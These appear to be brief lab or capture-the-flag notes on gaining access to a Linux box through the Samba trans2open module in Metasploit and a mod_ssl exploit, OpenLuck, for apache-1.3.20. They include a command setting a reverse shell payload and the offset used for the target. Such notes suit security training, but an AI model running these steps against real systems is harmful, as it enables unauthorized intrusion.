### metasploit

search for trans2open and use the linux module

We set rhost and lhost and run the exploit but it doesn't work.

We can try different payload.

`set payload linux/x86/shell_reverse_tcp`
We use a non staged payload instead of staged.id

### manual exploitation via mod_ssl

We use the exploit located here:
https://github.com/heltonWernik/OpenLuck

When running the exploit use `0x6b` because we are running `apache-1.3.20` (from enumeration)

No port required because we are attacking SSL?
